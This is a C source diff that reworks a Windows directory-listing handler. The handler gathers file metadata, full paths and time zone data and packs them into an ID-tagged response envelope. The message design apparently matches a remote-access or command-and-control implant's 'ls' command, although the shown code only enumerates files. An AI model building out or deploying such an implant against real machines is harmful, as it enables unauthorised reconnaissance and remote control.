@@ -740,13 +740,15 @@ BOOL LsHandlerCallback
 {
 	PFILE_INFO* pFirstFileInfo = (PFILE_INFO*)lpArgs;
 	PFILE_INFO pCurrentFileInfo = NULL;
-	UINT64 uModifiedTime = 0;
+	PFILETIME pModifiedTime = NULL;
+	LPSTR lpTemp = NULL;
 
 	if (pFirstFileInfo[0]->dwIdx >= pFirstFileInfo[0]->dwMaxCount) {
 		return TRUE;
 	}
 
 	wprintf(L"lpPath: %lls\n", lpPath);
+	pCurrentFileInfo = pFirstFileInfo[pFirstFileInfo[0]->dwIdx++];
 	if (IsFolderExist(lpPath)) {
 		pCurrentFileInfo->IsDir = TRUE;
 	}
@@ -754,16 +756,24 @@ BOOL LsHandlerCallback
 		pCurrentFileInfo->uFileSize = GetFileSizeByPath(lpPath);
 	}
 
-	pCurrentFileInfo = pFirstFileInfo[pFirstFileInfo[0]->dwIdx++];
-	pCurrentFileInfo->lpName = GetNameFromPathA(lpPath);
+	lpTemp = ConvertWcharToChar(lpPath);
+	pCurrentFileInfo->lpName = GetNameFromPathA(lpTemp);
+	FREE(lpTemp);
 	pCurrentFileInfo->lpOwner = GetFileOwner(lpPath);
-	uModifiedTime = GetModifiedTime(lpPath);
-	pCurrentFileInfo->uModifiedTime = ConvertFileTimeToUnixTimestamp(uModifiedTime);
-	if (IsStrEndsWithW(lpPath, L".lnk")) {
-		pCurrentFileInfo->lpLinkPath = GetTargetShortcutFile(lpPath);
+	pModifiedTime = GetModifiedTime(lpPath);
+	// #define FILETIME_TO_UNIXTIME(ft) (UINT)((*(LONGLONG*)&(ft)-116444736000000000)/10000000)
+	//pCurrentFileInfo->uModifiedTime = ConvertFileTimeToUnixTimestamp();
+	pCurrentFileInfo->uModifiedTime = (UINT)((*((LONGLONG*)pModifiedTime) - 116444736000000000) / 10000000);
+	FREE(pModifiedTime);
+	if (!pCurrentFileInfo->IsDir && IsStrEndsWithW(lpPath, L".lnk")) {
+		lpTemp = GetTargetShortcutFile(lpPath);
+		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
+		FREE(lpTemp);
 	}
 	else {
-		pCurrentFileInfo->lpLinkPath = GetSymbolLinkTargetPath(lpPath);
+		lpTemp = GetSymbolLinkTargetPath(lpPath);
+		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
+		FREE(lpTemp);
 	}
 
 	return FALSE;
@@ -798,10 +808,12 @@ PENVELOPE LsHandler
 {
 	PPBElement pRecvElement = NULL;
 	PPBElement FileInfoElement[8];
-	PPBElement FinalElement = NULL;
+	PPBElement LsElement[5];
+	PPBElement pFinalElement = NULL;
 	PPBElement* pElementList = NULL;
 	PBUFFER* UnmarshalledData = NULL;
 	LPSTR lpPath = NULL;
+	LPSTR lpFullPath = NULL;
 	LPWSTR lpConvertedPath = NULL;
 	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
@@ -809,6 +821,9 @@ PENVELOPE LsHandler
 	PFILE_INFO* FileList = NULL;
 	DWORD i = 0;
 	DWORD j = 0;
+	DWORD dwReturnedLength = 0;
+	CHAR szTimeZone[0x10];
+	TIME_ZONE_INFORMATION TimeZoneInfo;
 
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = Bytes;
@@ -820,12 +835,36 @@ PENVELOPE LsHandler
 	}
 
 	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
-	lpConvertedPath = ConvertCharToWchar(lpPath);
+	lpFullPath = ALLOC(MAX_PATH + 1);
+	dwReturnedLength = GetFullPathNameA(lpPath, MAX_PATH + 1, lpFullPath, NULL);
+	if (dwReturnedLength == 0) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetFullPathNameA() failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+	else if (dwReturnedLength > MAX_PATH) {
+		lpFullPath = REALLOC(lpFullPath, dwReturnedLength + 1);
+		GetFullPathNameA(lpPath, dwReturnedLength + 1, lpFullPath, NULL);
+	}
+
+	lpConvertedPath = ConvertCharToWchar(lpFullPath);
 	if (!IsPathExist(lpConvertedPath)) {
-		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
+		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpFullPath);
 		goto CLEANUP;
 	}
 
+	SecureZeroMemory(&TimeZoneInfo, sizeof(TimeZoneInfo));
+	GetTimeZoneInformation(&TimeZoneInfo);
+	sprintf_s(szTimeZone, _countof(szTimeZone), "%03d", TimeZoneInfo.Bias / (-60));
+	if (TimeZoneInfo.Bias <= 0) {
+		szTimeZone[0] = '+';
+	}
+	else {
+		szTimeZone[0] = '-';
+	}
+
+	SecureZeroMemory(LsElement, sizeof(LsElement));
+	LsElement[0] = CreateBytesElement(lpFullPath, lstrlenA(lpFullPath), 1);
+	LsElement[1] = CreateVarIntElement(TRUE, 2);
 	if (IsFileExist(lpConvertedPath)) {
 		
 	}
@@ -852,16 +891,19 @@ PENVELOPE LsHandler
 			pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
 		}
 
-		FinalElement = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 1);
+		LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
 	}
 
+	LsElement[3] = CreateBytesElement(szTimeZone, lstrlenA(szTimeZone), 4);
+	LsElement[4] = CreateVarIntElement(TimeZoneInfo.Bias < 0 ? -(TimeZoneInfo.Bias * 60) : TimeZoneInfo.Bias * 60, 5);
+	pFinalElement = CreateStructElement(LsElement, _countof(LsElement), 0);
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
 	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
-	pRespEnvelope->pData->pBuffer = FinalElement->pMarshalledData;
-	pRespEnvelope->pData->cbBuffer = FinalElement->cbMarshalledData;
-	FinalElement->pMarshalledData = NULL;
-	FinalElement->cbMarshalledData = 0;
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
 	if (lpErrorDesc != NULL) {
 		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
@@ -893,8 +935,12 @@ CLEANUP:
 		FREE(FileList);
 	}
 
+	if (lpFullPath != NULL) {
+		FREE(lpFullPath);
+	}
+
 	FreeElement(pRecvElement);
-	FreeElement(FinalElement);
+	FreeElement(pFinalElement);
 
 	return pRespEnvelope;
 }
